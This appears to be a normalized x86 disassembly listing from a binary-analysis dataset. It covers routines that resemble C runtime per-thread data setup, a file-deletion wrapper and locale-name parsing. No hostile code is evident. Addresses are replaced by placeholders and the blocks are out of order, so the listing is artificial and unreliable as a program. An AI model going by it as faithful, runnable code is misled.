mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f4ed
push esi
call sub_422732
pop ecx
push edi
call sub_42f8fa
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_422732
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_42f7a0
pop ecx
sub_42f50e
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_427556
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_4266a7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_427575
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_422732
pop ecx
xor esi esi
push 0x0
push esi
call sub_42f57d
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_42f57d
push 0x8
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f61e
push 0xc
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_42f710
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f627
call sub_429b15
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_42f630
call sub_4235e9
call sub_425c85
test eax eax
jne r-xdata
push sub_42f3bf
call sub_427519
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_42f6a6
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_4266a7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_42f6a6
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_427575
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_42f57d
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_42f6c3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_427af0
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_42f6f1
push ebp
mov ebp esp
xor edx edx
mov eax edx
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] dx
je r-xdata
sub_42f710
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_42f7a0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_422732
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_422732
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_422732
push [ esi + 0x88 ]
call sub_422732
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_436222
push [ esi + 0x9c ]
call sub_422732
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_422732
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_422732
push [ ebx ]
call sub_422732
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_422732
push [ esi + 0x84 ]
call sub_422732
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_422732
push [ esi + 0x84 ]
call sub_435b15
pop ecx
pop ecx
push eax
call sub_422732
pop ecx
push eax
call sub_422732
push [ esi + 0x84 ]
call sub_435fb3
pop ecx
pop ecx
sub_42f8fa
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_42f995
push 0xc
push r--data
call sub_429ad0
call sub_42f4f6
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_42fa11
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42fa08
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_42f4f6
mov esi [ eax + 0x6c ]
mov eax esi
call sub_429b15
retn
push 0x20
call sub_42350a
sub_42fa11
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_42f710
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_42f8fa
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_42f7a0
pop ecx
sub_42fa8c
push 0x8
push r--data
call sub_429ad0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_429b15
retn
push 0xc
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_42fa11
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42fad5
sub_42fade
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push 0x55
push [ ebp + 0x8 ]
call sub_42f6f1
mov ebx eax
pop ecx
pop ecx
cmp ebx 0x55
jb r-xdata
xor eax eax
pop ebp
retn
lea eax [ ebx * 2 + 0x2 ]
push edi
push eax
call sub_4266f1
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
push [ ebp + 0x8 ]
push eax
push edi
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
mov eax edi
jmp r-xdata
sub_42fb42
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422868
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_42a241
int3
lea eax [ edi + 0x80 ]
cmp [ eax ] si
je r-xdata
add edi 0x100
cmp [ edi ] si
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42fffb
add esp 0x14
pop edi
pop esi
pop ebp
retn
push edi
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42fffb
add esp 0x14
sub_42fbb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x1ca
xor ebx ebx
push ebx
push edi
call sub_427900
mov esi [ ebp + 0xc ]
add esp 0xc
movzx eax [ esi ]
test ax ax
jne r-xdata
push 0x2e
pop ecx
cmp ax cx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] ebx
lea eax [ esi + 0x2 ]
cmp [ eax ] bx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
or eax 0xffffffff
lea ecx [ esi + eax * 2 ]
mov [ ebp - 0x4 ] ecx
movzx ebx [ ecx ]
mov ecx [ ebp + 0xc ]
push 0x2c
pop edx
test ecx ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x100 ]
push 0x10
push eax
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x11e ] ax
jmp r-xdata
cmp ecx 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
push 0x2e
pop ecx
cmp bx cx
je r-xdata
cmp eax 0x10
jae r-xdata
cmp ebx 0x5f
je r-xdata
push eax
push esi
push 0x40
push edi
jmp r-xdata
test bx bx
je r-xdata
push eax
push esi
push 0x40
lea eax [ edi + 0x80 ]
jmp r-xdata
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
push eax
push esi
push 0x10
lea eax [ edi + 0x100 ]
cmp bx dx
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push 0x2c
pop eax
cmp bx ax
je r-xdata
call sub_42a241
int3
test bx bx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
inc [ ebp + 0xc ]
jmp r-xdata
push r--data
push esi
call sub_436e50
pop ecx
pop ecx
test eax eax
je r-xdata
sub_42fcda
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x2e
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_42f710
pop ecx
pop edi
sub_42fd06
push ebp
mov ebp esp
sub esp 0x1f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x1ec ] eax
mov [ ebp - 0x1f0 ] edi
call sub_42f4f6
lea ecx [ eax + 0xb4 ]
mov [ ebp - 0x1d8 ] ecx
lea ecx [ eax + 0xb8 ]
mov [ ebp - 0x1e0 ] ecx
lea ecx [ eax + 0x1be ]
mov [ ebp - 0x1d4 ] ecx
xor ecx ecx
mov [ ebp - 0x1dc ] ecx
test esi esi
jne r-xdata
add eax 0x2ec
push 0x55
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1e8 ] eax
push ebx
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_427b65
pop ecx
mov [ ebp - 0x1e4 ] eax
cmp eax 0x83
jae r-xdata
cmp [ esi + 0x2 ] ax
jne r-xdata
mov edi [ rw-data ]
xor edi [ rw-data ]
lea eax [ ebp - 0x1d0 ]
neg edi
sbb edi edi
push esi
not edi
push eax
and edi 0x1
call sub_42fbb0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x1d4 ]
call sub_436e12
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x1ec ]
push r--data
push [ ebp + 0x10 ]
push esi
call sub_422868
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x1d8 ]
lea eax [ ebp - 0x1d0 ]
push eax
test edi edi
mov edi [ ebp - 0x1d8 ]
push edi
push eax
je r-xdata
test edi edi
je r-xdata
push esi
push [ ebp - 0x1e0 ]
call sub_436e12
pop ecx
pop ecx
test eax eax
je r-xdata
test edi edi
je r-xdata
push ebx
call sub_427b65
inc eax
push eax
push ebx
push 0x55
push [ ebp - 0x1e8 ]
call sub_424aa8
add esp 0x14
test eax eax
jne r-xdata
push 0x2
lea eax [ ebp - 0x1dc ]
push eax
push 0x20001004
push esi
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
call sub_4373f6
call sub_437c42
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
mov esi [ ebp - 0x1ec ]
push ebx
push [ ebp + 0x10 ]
push esi
call sub_422868
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0x1d8 ]
push edi
call sub_424fc0
add esp 0xc
mov eax esi
jmp r-xdata
mov [ edi ] eax
jmp r-xdata
call [ GetACP@IAT ]
mov [ ebp - 0x1dc ] eax
mov eax [ ebp - 0x1dc ]
test eax eax
jne r-xdata
push esi
call sub_4296e4
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
mov edi 0x83
push edi
push [ ebp - 0x1d4 ]
call sub_42fb42
add esp 0xc
test ebx ebx
je r-xdata
add esp 0xc
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
push edi
push esi
push [ ebp + 0x18 ]
push ebx
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
movzx eax ax
mov [ edi ] eax
mov edi [ ebp - 0x1e4 ]
inc edi
push edi
push esi
push 0x83
push [ ebp - 0x1d4 ]
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
xor ebx ebx
cmp [ esi ] bx
je r-xdata
lea eax [ ebp - 0xb0 ]
push eax
call sub_427b65
inc eax
push eax
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp + 0x18 ]
push ebx
call sub_424aa8
add esp 0x14
test eax eax
je r-xdata
push edi
push esi
push 0x55
push [ ebp - 0x1e8 ]
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ eax ] cx
mov eax [ ebp - 0x1e4 ]
cmp eax edi
jae r-xdata
jmp r-xdata
mov edi 0x83
inc eax
push eax
push esi
push edi
push [ ebp - 0x1e0 ]
call sub_424aa8
add esp 0x10
test eax eax
je r-xdata
mov edi [ ebp - 0x1f0 ]
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
call sub_42a241
int3
sub_42fffb
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ebx
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop esi
pop ebx
pop ebp
retn
push edi
lea edi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42a241
int3
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
lea edi [ edi + 0x4 ]
push [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4227fc
add esp 0xc
test eax eax
jne r-xdata
pop edi
sub_43003a
push 0x14
push r--data
call sub_429ad0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_42f4f6
mov esi eax
mov [ ebp - 0x20 ] esi
call sub_42f995
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] ebx
push 0x1
push 0xb8
call sub_4266a7
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4301b2
mov eax ebx
push 0xc
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x6c ]
push edi
call sub_42fcda
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_430170
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_43032b
add esp 0xc
mov ebx eax
mov [ ebp - 0x1c ] ebx
test ebx ebx
je r-xdata
call sub_429b15
retn
push edi
call sub_42f8fa
push edi
call sub_42f7a0
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] 0x2
lea eax [ esi + 0x6c ]
push edi
push eax
call sub_42fa11
push edi
call sub_42f8fa
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_436e12
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_43017f
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
push [ esi + 0x6c ]
push rw-data
call sub_42fa11
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + 0x84 ]
mov [ rw-data ] eax
mov eax [ ecx + 0x90 ]
mov [ rw-data ] eax
mov eax [ ecx + 0x74 ]
mov [ rw-data ] eax
sub_4301b7
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
xor edi edi
inc edi
push 0x6a6
mov [ ebp - 0x8 ] edi
call sub_4266f1
mov ebx eax
xor eax eax
pop ecx
test ebx ebx
je r-xdata
pop edi
pop ebx
leave
retn
push esi
lea esi [ ebx + 0x4 ]
mov [ esi ] ax
mov [ ebx ] edi
mov edi [ ebp + 0x8 ]
push [ edi + 0x24 ]
push r--data
push [ r--data ]
push 0x3
push 0x351
push esi
call sub_42fffb
mov eax r--data
mov [ ebp - 0x4 ] eax
lea eax [ edi + 0x24 ]
add esp 0x18
mov [ ebp - 0xc ] eax
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_42a241
int3
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x10 ]
push [ esi ]
push [ eax ]
call sub_436e12
neg eax
sbb eax eax
not eax
and [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ecx esi
add eax 0xc
push [ ecx ]
lea esi [ ebx + 0x4 ]
push r--data
push [ eax ]
mov [ ebp - 0xc ] ecx
push 0x3
push 0x351
push esi
mov [ ebp - 0x4 ] eax
call sub_42fffb
mov eax [ ebp - 0x4 ]
add esp 0x20
cmp eax r--data
jl r-xdata
push r--data
push 0x351
push esi
call sub_4227fc
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebx
call sub_422732
cmp [ edi + 0x1c ] 0x0
mov esi [ InterlockedDecrement@IAT ]
pop ecx
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
cmp [ edi + 0x18 ] 0x0
je r-xdata
push [ edi + 0x1c ]
call esi
test eax eax
jne r-xdata
cmp [ edi + 0x18 ] 0x0
je r-xdata
push [ edi + 0x1c ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x34 ]
xor ecx ecx
mov [ edi + 0x18 ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x1c ] ecx
mov [ edi + 0x14 ] ecx
jmp r-xdata
push [ edi + 0x18 ]
call esi
test eax eax
jne r-xdata
push [ edi + 0x1c ]
call sub_422732
pop ecx
xor ecx ecx
mov [ edi + 0x18 ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x1c ] ebx
mov [ edi + 0x14 ] esi
mov eax esi
push [ edi + 0x18 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push [ edi + 0x1c ]
call sub_422732
pop ecx
pop esi
push [ edi + 0x18 ]
call sub_422732
pop ecx
push [ edi + 0x18 ]
call sub_422732
pop ecx
sub_43032b
push ebp
mov ebp esp
sub esp 0x1cc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x1cc ] edi
test eax eax
je r-xdata
xor eax eax
mov ebx eax
mov [ ebp - 0x1c0 ] 0x1
mov [ ebp - 0x1c4 ] ebx
test esi esi
je r-xdata
test esi esi
je r-xdata
push edi
call sub_4301b7
pop ecx
cmp [ esi ] 0x4c
jne r-xdata
add eax eax
mov eax [ edi + eax * 8 + 0x14 ]
jmp r-xdata
push esi
push eax
push edi
call sub_4305b2
add esp 0xc
jmp r-xdata
push eax
push 0x55
lea eax [ ebp - 0x1b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42fd06
add esp 0x18
test eax eax
je r-xdata
cmp [ esi + 0x2 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
lea eax [ edi + 0x14 ]
xor esi esi
mov [ ebp - 0x1bc ] eax
cmp [ esi + 0x4 ] 0x5f
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
push [ eax ]
lea eax [ ebp - 0x10c ]
push eax
call sub_436e12
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push esi
call sub_436e9f
pop ecx
pop ecx
mov [ ebp - 0x1c8 ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x1bc ]
lea eax [ ebp - 0x10c ]
push eax
push esi
push edi
call sub_4305b2
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx eax
sub ecx esi
sar ecx 0x1
mov [ ebp - 0x1bc ] ecx
je r-xdata
test ebx ebx
je r-xdata
inc ebx
xor ecx ecx
mov [ ebp - 0x1c0 ] ecx
jmp r-xdata
push 0x3b
pop ecx
cmp [ eax ] cx
je r-xdata
inc esi
add eax 0x10
mov [ ebp - 0x1bc ] eax
cmp esi 0x5
jle r-xdata
mov edi [ ebp - 0x1bc ]
mov [ ebp - 0x1c0 ] 0x1
mov ebx r--data
inc [ ebp - 0x1c0 ]
add ebx 0xc
cmp ebx r--data
jle r-xdata
push [ ebx ]
call sub_427b65
pop ecx
cmp edi eax
je r-xdata
push edi
push esi
push [ ebx ]
call sub_433bd5
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x1c8 ]
add esi 0x2
push r--data
push esi
call sub_436e50
mov edi [ ebp - 0x1cc ]
mov ebx [ ebp - 0x1c4 ]
pop ecx
pop ecx
mov [ ebp - 0x1bc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x1c0 ] 0x5
jg r-xdata
push 0x3b
pop ecx
cmp [ esi ] cx
jne r-xdata
lea esi [ esi + eax * 2 ]
xor eax eax
cmp [ esi ] ax
je r-xdata
push eax
push esi
lea eax [ ebp - 0x10c ]
push 0x83
push eax
call sub_424aa8
add esp 0x10
test eax eax
jne r-xdata
test ebx ebx
jne r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
mov eax [ ebp - 0x1bc ]
add eax eax
cmp eax 0x106
jae r-xdata
jmp r-xdata
call sub_424c9c
xor ecx ecx
mov [ ebp + eax - 0x10c ] cx
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x1c0 ]
push edi
call sub_4305b2
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
je r-xdata
inc ebx
mov [ ebp - 0x1c4 ] ebx
sub_4305b2
push ebp
mov ebp esp
sub esp 0x2ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x2cc ] ebx
call sub_42f4f6
add eax 0x2c4
mov [ ebp - 0x2c0 ] eax
lea eax [ ebp - 0x2d4 ]
push eax
push 0x55
lea eax [ ebp - 0x2b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42fd06
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
lea eax [ ebp - 0x10c ]
push [ ebx + edi + 0x14 ]
mov [ ebp - 0x2e4 ] ebx
push eax
call sub_436e12
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x10c ]
push eax
call sub_427b65
lea esi [ eax + 0x1 ]
lea ecx [ esi * 2 + 0x4 ]
push ecx
call sub_4266f1
pop ecx
pop ecx
mov [ ebp - 0x2dc ] eax
test eax eax
je r-xdata
mov eax [ ebx + edi + 0x14 ]
jmp r-xdata
lea ecx [ eax + 0x4 ]
mov eax [ ebx + edi + 0x14 ]
mov [ ebp - 0x2e0 ] eax
mov eax [ ebp - 0x2cc ]
add eax 0x28
mov [ ebp - 0x2d0 ] ecx
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x2c4 ] eax
mov eax [ eax ]
mov [ ebp - 0x2ec ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x2e8 ] eax
lea eax [ ebp - 0x10c ]
push eax
push esi
push ecx
call sub_422868
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
push esi
push esi
push esi
push esi
push esi
call sub_42a241
int3
cmp [ ebp - 0x10c ] 0x43
mov eax [ ebp - 0x2d0 ]
mov [ ebx + edi + 0x14 ] eax
jne r-xdata
lea eax [ ebp - 0x2b8 ]
push eax
call sub_42fade
pop ecx
mov ecx [ ebp - 0x2c4 ]
mov [ ecx ] eax
cmp [ ebp - 0x10a ] si
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ ebp - 0x2d4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x2c0 ]
mov [ ebp - 0x2c8 ] eax
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x2d8 ] ecx
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x2d0 ] ecx
mov ecx esi
mov [ ebp - 0x2bc ] ecx
mov ecx [ ebp - 0x2c4 ]
mov [ ecx ] esi
jmp r-xdata
cmp edx 0x5
jne r-xdata
mov eax [ ebp - 0x2d4 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x2c8 ]
mov edx [ ebp - 0x2c8 ]
mov eax [ ecx ]
mov ebx [ ebp - 0x2d8 ]
mov ecx [ ecx + 0x4 ]
add [ ebp - 0x2c8 ] 0x8
mov [ edx ] ebx
mov ebx [ ebp - 0x2d0 ]
mov [ ebp - 0x2d0 ] ecx
mov ecx [ ebp - 0x2bc ]
inc ecx
